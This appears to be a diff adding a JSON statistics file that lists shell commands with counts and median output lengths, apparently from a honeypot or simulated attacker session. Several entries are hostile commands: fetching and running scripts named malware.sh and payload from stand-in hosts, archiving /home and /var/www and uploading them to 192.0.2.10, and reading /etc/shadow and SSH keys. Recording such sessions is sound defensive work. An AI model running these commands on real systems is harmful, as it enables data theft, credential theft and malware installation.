@@ -1,0 +1,214 @@
+{
+ "./b.sh": {
+  "n": 1,
+  "median_chars": 62
+ },
+ "./malware.sh": {
+  "n": 1,
+  "median_chars": 70
+ },
+ "arp -a": {
+  "n": 1,
+  "median_chars": 52
+ },
+ "cat /etc/crontab": {
+  "n": 1,
+  "median_chars": 32
+ },
+ "cat /etc/group": {
+  "n": 1,
+  "median_chars": 567
+ },
+ "cat /etc/hosts": {
+  "n": 1,
+  "median_chars": 219
+ },
+ "cat /etc/shadow": {
+  "n": 1,
+  "median_chars": 781
+ },
+ "cat /proc/meminfo": {
+  "n": 2,
+  "median_chars": 1204.0
+ },
+ "cat ~/.bash_history": {
+  "n": 1,
+  "median_chars": 83
+ },
+ "cat ~/.ssh/config": {
+  "n": 1,
+  "median_chars": 84
+ },
+ "cd /dev/shm": {
+  "n": 1,
+  "median_chars": 34
+ },
+ "cd /tmp": {
+  "n": 1,
+  "median_chars": 26
+ },
+ "cd /var/tmp": {
+  "n": 1,
+  "median_chars": 34
+ },
+ "chmod +x b.sh": {
+  "n": 1,
+  "median_chars": 91
+ },
+ "chmod +x payload": {
+  "n": 1,
+  "median_chars": 97
+ },
+ "chmod 777 malware.sh": {
+  "n": 1,
+  "median_chars": 100
+ },
+ "curl -O http://pkg-repo.example/payload": {
+  "n": 1,
+  "median_chars": 113
+ },
+ "curl -T /dev/shm/d.tgz http://192.0.2.10/u": {
+  "n": 1,
+  "median_chars": 154
+ },
+ "curl -T /var/tmp/d.tgz http://192.0.2.10/u": {
+  "n": 1,
+  "median_chars": 152
+ },
+ "date": {
+  "n": 2,
+  "median_chars": 50.0
+ },
+ "df -h": {
+  "n": 1,
+  "median_chars": 612
+ },
+ "du -sh /home /var/www": {
+  "n": 1,
+  "median_chars": 46
+ },
+ "du -sh /var/log": {
+  "n": 2,
+  "median_chars": 42.0
+ },
+ "find / -name id_rsa 2>/dev/null": {
+  "n": 1,
+  "median_chars": 50
+ },
+ "find / -perm -4000 -type f 2>/dev/null": {
+  "n": 2,
+  "median_chars": 55.5
+ },
+ "find /home -name '*.db' 2>/dev/null": {
+  "n": 2,
+  "median_chars": 51.0
+ },
+ "id": {
+  "n": 2,
+  "median_chars": 67.0
+ },
+ "ifconfig": {
+  "n": 1,
+  "median_chars": 926
+ },
+ "ls": {
+  "n": 1,
+  "median_chars": 17
+ },
+ "ls -la": {
+  "n": 3,
+  "median_chars": 117
+ },
+ "ls -la ~/.ssh": {
+  "n": 1,
+  "median_chars": 91
+ },
+ "lscpu": {
+  "n": 1,
+  "median_chars": 617
+ },
+ "ping -c 2 192.0.2.5": {
+  "n": 1,
+  "median_chars": 76
+ },
+ "ps aux": {
+  "n": 1,
+  "median_chars": 6258
+ },
+ "pwd": {
+  "n": 4,
+  "median_chars": 33.0
+ },
+ "rm -f /dev/shm/d.tgz /dev/shm/d.tar": {
+  "n": 1,
+  "median_chars": 52
+ },
+ "rm -f /var/tmp/d.tgz /var/tmp/d.tar": {
+  "n": 1,
+  "median_chars": 50
+ },
+ "rm -rf b.sh": {
+  "n": 1,
+  "median_chars": 34
+ },
+ "sh payload": {
+  "n": 1,
+  "median_chars": 74
+ },
+ "shell": {
+  "n": 2,
+  "median_chars": 54.5
+ },
+ "sudo -l": {
+  "n": 2,
+  "median_chars": 681.5
+ },
+ "system": {
+  "n": 1,
+  "median_chars": 62
+ },
+ "systemctl status ssh": {
+  "n": 1,
+  "median_chars": 73
+ },
+ "tail -n 50 /var/log/syslog": {
+  "n": 2,
+  "median_chars": 43.0
+ },
+ "tar cf /dev/shm/d.tar /var/www": {
+  "n": 1,
+  "median_chars": 224
+ },
+ "tar czf /var/tmp/d.tgz /home": {
+  "n": 1,
+  "median_chars": 220
+ },
+ "uname -a": {
+  "n": 1,
+  "median_chars": 96
+ },
+ "uname -r": {
+  "n": 1,
+  "median_chars": 37
+ },
+ "w": {
+  "n": 2,
+  "median_chars": 215.0
+ },
+ "wget http://mirror.example/b.sh": {
+  "n": 1,
+  "median_chars": 251
+ },
+ "wget http://mirror.example/malware.sh": {
+  "n": 1,
+  "median_chars": 259
+ },
+ "who": {
+  "n": 1,
+  "median_chars": 72
+ },
+ "whoami": {
+  "n": 2,
+  "median_chars": 30.0
+ }
+}
